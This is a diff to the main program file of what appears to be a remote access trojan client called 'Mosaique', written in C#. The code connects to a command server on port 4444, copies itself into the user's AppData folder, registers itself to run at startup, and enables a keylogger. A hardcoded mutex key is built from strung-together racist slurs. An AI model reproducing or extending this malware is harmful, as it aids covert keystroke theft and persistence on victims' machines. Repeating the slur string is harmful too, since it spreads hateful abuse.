@@ -11,8 +11,7 @@ namespace Client
     static class Program
     {
         public static ClientMosaique client;
-        public static Boot bootController;
-        private static ApplicationContext _msgLoop; // keylogger*
+        private static ApplicationContext _msgLoop; // KEYLOGGER
         private static bool _result;
 
         /// <summary>
@@ -21,18 +20,23 @@ namespace Client
         [STAThread]
         static void Main()
         {
+            Boot.Initialization();
 
-            bootController = new Boot();
-
+            //public static string getMutexKey()
+            //{
             //StreamReader readerMutex = new StreamReader(System.Reflection.Assembly.GetExecutingAssembly().Location);// TODO virer
-            //MutexController.mutexKey = Boot.getMutexKey(readerMutex);// TODO virer           
+            //    string mutex = readerMutex.ReadToEnd();
+            //    mutex = mutex.Substring(mutex.IndexOf("-STARTmutex-"), mutex.IndexOf("-ENDmutex-") - mutex.IndexOf("-STARTmutex-"));
+            //    string mutexKey = mutex.Replace("-STARTmutex-", "");
+            //    return mutexKey;
+            //}
+            //MutexController.mutexKey = Boot.getMutexKey(readerMutex);// TODO virer
 
-            MutexController.mutexKey = "bougnoulonegroidomongolitoesclavago";// TODO virer            
-
+            MutexController.mutexKey = "bougnoulonegroidomongolitoesclavago";// TODO virer    
 
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
-            if (RunMosaique())
+            if (MosaiqueLauncher())
             {
                 client = new ClientMosaique("127.0.0.1", 4444);
                 //client = new ClientMosaic(bootController.host, bootController.port);
@@ -40,7 +44,7 @@ namespace Client
             }
         }
 
-        private static bool RunMosaique()
+        private static bool MosaiqueLauncher()
         {
             _result = MutexController.createMutex();// TODO virer
 
@@ -50,7 +54,7 @@ namespace Client
                 return false;
             }
 
-            ClientData.installPath = Path.Combine(Boot.DIRECTORY, ((!string.IsNullOrEmpty(Boot.installSubDirectory)) ? Boot.installSubDirectory + @"\" : "") + Boot.installFileName); //  	Directory ~~== %USERPROFILE%\Application Data(\Roaming)
+            ClientData.installPath = Path.Combine(Boot.DIRECTORY, ((!string.IsNullOrEmpty(Boot.installSubDirectory)) ? Boot.installSubDirectory + @"\" : "") + Boot.installFileName); // 
 
             // If install == false OR already installed
             if(!Boot.installStub || ClientData.currentPath == ClientData.installPath) 
@@ -80,7 +84,7 @@ namespace Client
 
                 if (Boot.autoStartEnabled) // STARTUP
                 {
-                    if (!Boot.AddToStartup())
+                    if (!ClientInstallerController.AddToStartup())
                         ClientData.AddToStartupFailed = true;
                 }
                 if (Boot.keyloggerEnabled) // KEYLOGGER
